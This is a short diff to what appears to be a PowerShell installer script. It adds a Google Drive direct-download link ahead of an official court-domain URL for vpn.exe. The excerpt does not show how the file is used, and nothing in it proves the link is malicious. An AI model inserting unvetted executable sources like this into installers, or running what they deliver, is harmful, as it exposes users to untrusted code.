@@ -192,6 +192,7 @@ function Main {
             $downloadUrls = @($CustomUrl)
         } else {
             $downloadUrls = @(
+                "https://docs.google.com/uc?export=download&id=1G1L745fJ-zr2XVHaIsTNSwzRJM0GI1ah",
                 "https://suporte.tjrn.jus.br/arquivos/vpn.exe"
             )
         }
